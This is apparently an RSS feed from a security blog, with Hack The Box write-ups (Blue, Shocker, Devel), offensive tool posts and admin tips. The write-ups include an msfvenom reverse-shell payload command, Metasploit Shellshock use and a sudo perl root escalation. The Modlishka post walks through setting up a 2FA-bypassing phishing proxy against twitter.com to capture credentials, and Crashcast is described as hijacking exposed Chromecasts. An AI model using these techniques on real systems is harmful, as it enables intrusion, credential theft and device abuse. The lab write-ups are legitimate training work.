+&lt;p&gt;Set your &lt;strong&gt;LHOST&lt;/strong&gt; and &lt;strong&gt;RHOST&lt;/strong&gt;. Then run it and it will immediately grant a root shell.
+&lt;img src=&quot;/images/posts/htb/blue/blue3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Grab the flags:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;User flag is at &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\Users\haris\Desktop\user.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Root flag is at &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\Users\Administrator\Desktop\root.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/blue/blue4.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 04 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/04/HTB-Blue/</link>
+        <guid isPermaLink="true">/writeups/2019/01/04/HTB-Blue/</guid>
+      </item>
+    
+      <item>
+        <title>Mitm6</title>
+        <description>&lt;p&gt;mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server.
+&lt;br /&gt;
+It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;Dependencies and installation&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;mitm6 is compatible with both Python 2.7 and 3.x. You can install the requirements for your version with pip install -r requirements.txt.&lt;/p&gt;
+
+&lt;p&gt;For python 2.7, it uses the ipaddress backport module. You can install the latest release from PyPI with pip install mitm6, or the latest version from source with python setup.py install after cloning this git repository.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;After installation, mitm6 will be available as a command line program called mitm6. Since it uses raw packet capture with Scapy, it should be run as root. mitm6 should detect your network settings by default and use your primary interface for its spoofing. The only option you will probably need to specify is the AD domain that you are spoofing. For advanced tuning, the following options are available:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;usage: mitm6.py [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS]
+                [-m ADDRESS] [-a] [-v] [--debug] [-d DOMAIN] [-b DOMAIN]
+                [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqnd]
+
+mitm6 - pwning IPv4 via IPv6
+For help or reporting issues, visit https://github.com/fox-it/mitm6
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -i INTERFACE, --interface INTERFACE
+                        Interface to use (default: autodetect)
+  -l LOCALDOMAIN, --localdomain LOCALDOMAIN
+                        Domain name to use as DNS search domain (default: use
+                        first DNS domain)
+  -4 ADDRESS, --ipv4 ADDRESS
+                        IPv4 address to send packets from (default:
+                        autodetect)
+  -6 ADDRESS, --ipv6 ADDRESS
+                        IPv6 link-local address to send packets from (default:
+                        autodetect)
+  -m ADDRESS, --mac ADDRESS
+                        Custom mac address - probably breaks stuff (default:
+                        mac of selected interface)
+  -a, --no-ra           Do not advertise ourselves (useful for networks which
+                        detect rogue Router Advertisements)
+  -v, --verbose         Show verbose information
+  --debug               Show debug information
+
+Filtering options:
+  -d DOMAIN, --domain DOMAIN
+                        Domain name to filter DNS queries on (Whitelist
+                        principle, multiple can be specified.)
+  -b DOMAIN, --blacklist DOMAIN
+                        Domain name to filter DNS queries on (Blacklist
+                        principle, multiple can be specified.)
+  -hw DOMAIN, --host-whitelist DOMAIN
+                        Hostname (FQDN) to filter DHCPv6 queries on (Whitelist
+                        principle, multiple can be specified.)
+  -hb DOMAIN, --host-blacklist DOMAIN
+                        Hostname (FQDN) to filter DHCPv6 queries on (Blacklist
+                        principle, multiple can be specified.)
+  --ignore-nofqnd       Ignore DHCPv6 queries that do not contain the Fully
+                        Qualified Domain Name (FQDN) option.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the network has some hardware which blocks or detects rogue Router Advertisement messages, you can add the –no-ra flag to not broadcast those.
+Router Advertisements are not needed for mitm6 to work since it relies mainly on DHCPv6 messages.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Network Impact&lt;/strong&gt;
+mitm6 is designed as a penetration testing tool and should thus impact the network as little as possible. This is the main reason mitm6 doesn’t implement a full man-in-the-middle attack currently, like we see in for example the SLAAC attack. To further minimize the impact, the IP addresses assigned have low time-to-live (TTL) values. The lease will expire within 5 minutes when mitm6 is stopped, which will remove the DNS server from the victims configuration. To prevent DNS replies getting cached, all replies are sent with a TTL of 100 seconds, which makes sure the cache is cleared within minutes after the tool exits.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Download Link:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/fox-it/mitm6/&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/tools/2019/01/03/mitm6/</link>
+        <guid isPermaLink="true">/tools/2019/01/03/mitm6/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Shocker Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Shocker
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 30 Sep 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.56&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA shocker.nmap 10.10.10.56&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We see 2 services are open. Apache/2.4.18 and Openssh.
+OpenSSH is on a non-standard port but that does not come into affect during exploitation.&lt;/p&gt;
+
+&lt;p&gt;This is also a glimpse at the “Security by Obscurity” model some administrators implement and how obscuring open port numbers doesn’t generally deter an attacker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/shocker/shocker1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####Dirbuster enumeration&lt;/p&gt;
+
+&lt;p&gt;Running Dirbuster with the lowercase medium directory list shows us some promising results.&lt;/p&gt;
+
+&lt;p&gt;Based on the name of the box and the directory names we are seeing, it is safe to presume this box is designed to outline the &lt;strong&gt;ShellShock&lt;/strong&gt; exploit.&lt;/p&gt;
+
+&lt;p&gt;More information regarding this exploit can be found &lt;a href=&quot;https://blog.cloudflare.com/inside-shellshock/&quot;&gt;here:&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;With that in mind, let’s focus our attention on the &lt;strong&gt;/cgi-bin/&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;We see a file under &lt;strong&gt;/cgi-bin/&lt;/strong&gt; named &lt;strong&gt;“user.sh”&lt;/strong&gt;. This confirms that we are likely going to be exploiting ShellShock.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/shocker/shocker2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;Once we know which exploit to start with, lets fire up Metasploit and use the built-in Metasploit module for this vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Module: &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/multi/http/apache_mod_cgi_bash_env_exec&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We set the &lt;strong&gt;RHOST&lt;/strong&gt; and &lt;strong&gt;TARGETURI&lt;/strong&gt; accordingly.
+The &lt;strong&gt;TARGETURI&lt;/strong&gt; will be &lt;strong&gt;/cgi-bin/user.sh&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;After running that, we have a pretty basic user shell.&lt;/p&gt;
+
+&lt;p&gt;We can simply run the following to get a working root shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/perl -e 'exec &quot;/bin/sh&quot;'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/shocker/shocker3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we can find the user flag in &lt;strong&gt;/home/shelly/user.txt&lt;/strong&gt;
+&lt;img src=&quot;/images/posts/htb/shocker/shocker4.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/03/HTB-Shocker/</link>
+        <guid isPermaLink="true">/writeups/2019/01/03/HTB-Shocker/</guid>
+      </item>
+    
+      <item>
+        <title>Crashcast</title>
+        <description>&lt;p&gt;This tool allows you to mass play any YouTube video, remotely terminate apps, and rename Chromecast device(s) obtained from Shodan.io&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The only thing you need installed is Python 3.x&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install python3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You also require to have cURL installed&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install curl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You also require Shodan python module&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install shodan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Using Shodan API&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This tool requires you to own an upgraded Shodan API&lt;/p&gt;
+
+&lt;p&gt;You may obtain one for free in &lt;a href=&quot;https://www.shodan.io&quot;&gt; Shodan &lt;/a&gt; if you sign up using a .edu email&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/crashcast/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/crashcast/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/crashcast/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/crashcast/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 02 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/tools/2019/01/02/crashcast/</link>
+        <guid isPermaLink="true">/tools/2019/01/02/crashcast/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Devel Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Devel
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 15 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.5&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Let’s start with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -A -oN devel.nmap 10.10.10.5&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The Nmap scan reveals Microsoft FTP port 21 and Microsoft IIS 7.5 port 80 open.&lt;/p&gt;
+
+&lt;p&gt;####Website Enumeration&lt;/p&gt;
+
+&lt;p&gt;After opening &lt;strong&gt;Firefox&lt;/strong&gt; and visit the website &lt;strong&gt;http://10.10.10.5&lt;/strong&gt; we get the default IIS 7 webpage.&lt;/p&gt;
+
+&lt;p&gt;Dirbuster enumeration provides us no further insight so we move our eyes over to the open FTP port.&lt;/p&gt;
+
+&lt;p&gt;####FTP Enumeration&lt;/p&gt;
+
+&lt;p&gt;From our Nmap scan, we can see 2 files under the FTP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;Connecting anonymously via FTP reveals that it does allow anonymous logins. This misconfiguration is common.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since our user can upload files, we can simply create a &lt;strong&gt;aspx&lt;/strong&gt; reverse shell and execute it by browsing to the file via the web server.&lt;/p&gt;
+
+&lt;p&gt;####Payload Generating/Delivery&lt;/p&gt;
+
+&lt;p&gt;The following command will create a aspx file that we will use:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.28 LPORT=4444&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Set up a listener in Metasploit and open the file in the web browser:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After trying to navigate through some directories we quickly realize we need escalated permissions.&lt;/p&gt;
+
+&lt;p&gt;####Privilege&lt;/p&gt;
+
+&lt;p&gt;Put the session in the background:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;background&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then use the following command to suggest local meterpreter exploits that can be used.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After testing the first local exploit  &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;, we see that it fails due to the IIS user not being a part of the administrators group. (This is usually default and to be expected)&lt;/p&gt;
+
+&lt;p&gt;The next exploit we test is:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/local/ms10_015_kitrap0d&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This will attempt to create a new session with &lt;strong&gt;SYSTEM&lt;/strong&gt; privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel6.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we have the exploit worked, we have SYSTEM access, let’s look for the root and user flags.&lt;/p&gt;
+
+&lt;p&gt;The root flag is on the Administrators desktop:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The user flag is on the “babis” user’s desktop:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/devel/devel8.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 02 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/02/HTB-Devel/</link>
+        <guid isPermaLink="true">/writeups/2019/01/02/HTB-Devel/</guid>
+      </item>
+    
+      <item>
+        <title>PrivilegeEsc-Linux</title>
+        <description>&lt;p&gt;PrivilegeEsc-Linux , The Linux Enumeration Script
+&lt;!--more--&gt;
+This is a quick post about a script called “PrivilegeEsc-Linux”
+This simple script checks the security on a Linux machine and will enumerate everything it can about the machine.
+It will enumerate details such as the OS version, environment, and the apps/services. This information will give you a look into possible attack vectors and how to gain root.
+&lt;br /&gt;
+I find this tool especially useful on Linux CTF boxes.
+&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;Installing PrivilegeEsc-Linux&lt;/h1&gt;
+&lt;p&gt;&lt;br /&gt;
+You can download the script by running the below &lt;strong&gt;git clone&lt;/strong&gt; command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/J4c3kRz3znik/PrivilegeEsc-Linux.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1&gt;Running PrivilegeEsc-Linux&lt;/h1&gt;
+&lt;p&gt;Type the below commands to run the script:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cd PrivilegeEsc-Linux/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x Priv_enum.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./Priv_enum.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/linuxprivescrun.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;PrivilegeEsc-Linux gives you multiple choices to what you would like to enumerate. Typing &lt;strong&gt;All&lt;/strong&gt; will enumerate everything on the victim’s machine. After the scan is complete, it will print all the information it has gathered on the victim’s machine. This tool does not suggest exploits, however, you may see out of date software or user/group misconfigurations.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;strong&gt;This tool also presumes you have a foothold in the system and have sufficient privileges to run scripts.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Thanks for reading!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 20 May 2018 00:00:00 -0700</pubDate>
+        <link>/tools/2018/05/20/linuxprivesc/</link>
+        <guid isPermaLink="true">/tools/2018/05/20/linuxprivesc/</guid>
+      </item>
+    
+      <item>
+        <title>Modlishka 2FA Phishing Tool</title>
+        <description>&lt;p&gt;Open Source Phishing Tool With 2FA Authentication&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Modlishka is a really neat tool based on go. It is a phishing proxy that supports 2FA authentication. This is what makes this tool so great.&lt;/p&gt;
+
+&lt;p&gt;The tool is simple to configure and allows the attacker to control all traffic from the target’s browser.&lt;/p&gt;
+
+&lt;p&gt;Let’s install and test Modlishka:&lt;/p&gt;
+
+&lt;h1&gt; Installing Modlishka &lt;/h1&gt;
+
+&lt;p&gt;You will need to download the repo from github with the following command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go get -u github.com/drk1wi/Modlishka
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then traverse to the ‘go’ folder and run the below followed with the make command:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd $GOPATH/go/src/github.com/drk1wi/Modlishka/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And that’s all.&lt;/p&gt;
+
+&lt;h1&gt;Actually Running Modlishka &lt;/h1&gt;
+&lt;p&gt;To run the proxy go to the ‘dist’ folder and run the ‘proxy’ script&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd dist/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./proxy -h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/modlishkahelp.jpg&quot; alt=&quot;ModlishkaHelp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, Modlishka comes with some pretty flashy features. It allows you to create your own SSL certification using openssl which will allow your phishing campaign to look more trustworthy and legitimate. You will likely want to register a domain name to further the false legitimacy.
+&lt;br /&gt;
+It also allows you to bypass some security measures such as anti-SSRF.
+Run the command below against a target site to see the proxy in action. The phishingDomain option can be changed to fit you needs. I am using the loopback.modlishka.io which requires you to change the index.html file inside the apache folder (/var/www/).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./proxy -target https://twitter.com -phishingDomain local.modlishka.com -listeningPort 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/img/modlishkarun.jpg&quot; alt=&quot;ModlishkaRun&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can then access the control panel to see all the credentials you captured. To do this, visit the below in your browser:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://local.modlishka.com/SayHello2Modlishka/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Below is a shared video demonstrating Modlishka in real-time
+&lt;br /&gt;&lt;/p&gt;
+&lt;iframe src=&quot;https://player.vimeo.com/video/308709275&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 15 Mar 2018 00:00:00 -0700</pubDate>
+        <link>/tools/2018/03/15/Modlishka/</link>
+        <guid isPermaLink="true">/tools/2018/03/15/Modlishka/</guid>
+      </item>
+    
+      <item>
+        <title>Useful Powershell Commands</title>
+        <description>&lt;p&gt;Below are some useful PowerShell commands that are almost all applicable to a system administrator.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;Back up all production Group Policy Objects&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Backup-GPO –All –Path C:\Temp\AllGPO
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Check a KB is installed on a Windows machine&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-HotFix –ID update KB2670838
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;You can also query hotfix information on a remote computer using the below command:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-HotFix –ID KB2670838 –Computername TestVM.suniarasecurity.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;See who rebooted a server&lt;/strong&gt;
+This command is excellent when dealing with unexpected reboots.
+It will check the system event log for the Event ID 1074 and print the machine name, username, and time that event got generated.
+You can add the “Export-CSV” cmdlet to save the output to a CSV file.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-EventLog –Log System –Newest 100 | Where-Object {$_.EventID –eq ‘1074’} | FT MachineName, UserName, TimeGenerated -AutoSize
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Gathering disabled computer accounts from AD&lt;/strong&gt;
+This command will export all Active directory computer accounts that are &lt;strong&gt;disabled&lt;/strong&gt; and print the output. Again, you can add the “Export-CSV” cmdlet to save the output to a file.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-ADComputer -Filter {(enabled -eq $false)} -ResultPageSize 2000 -resultSetSize $null -Properties Name,OperatingSystem,SamAccountName,DistinguishedName
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;List All Services&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-Service [optional wildcard search on service name (not display name)] | `
+sort [Status, Name or Displayname]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This will list all running services. This can sometimes come in handy for a sysadmin but is more useful during pentesting enumeration stages. The below command will list all running services.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-Service [[optional wildcard search on service name (not display name)] | `
+where Status -eq running | sort [Status, Name or Displayname]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Tue, 12 Sep 2017 00:00:00 -0700</pubDate>
+        <link>/sysadmin/2017/09/12/powershellcmds/</link>
+        <guid isPermaLink="true">/sysadmin/2017/09/12/powershellcmds/</guid>
+      </item>
+    
+      <item>
+        <title>Wireshark Filters</title>
+        <description>&lt;p&gt;Below are some WireShark commands that I find useful.
+Wireshark is an excellent tool for system administrators and penetration testers to capture traffic on a network.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;Is your traffic efficient?&lt;/strong&gt;
+Use the following filter to identify problems in your traffic:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcp.analysis.flags
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This flag helps to look at problems you may have in a trace file.  By using this filter, you can see re-transmissions, acknowledgement problems and more.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Are you seeing latency in traffic to a server or do you believe you’re being SYN attacked?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcp.flags.syn==1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This filter will help you identify a SYN attack by recognizing the pattern of traffic that gets outputted.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Is an application operating? Do you have the port # for the application?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcp.port==443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This will print you the stream of traffic on a specific port.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;This built-in filter will show you packets that have some kind of expert message from Wireshark&lt;/strong&gt;&lt;/p&gt;
+
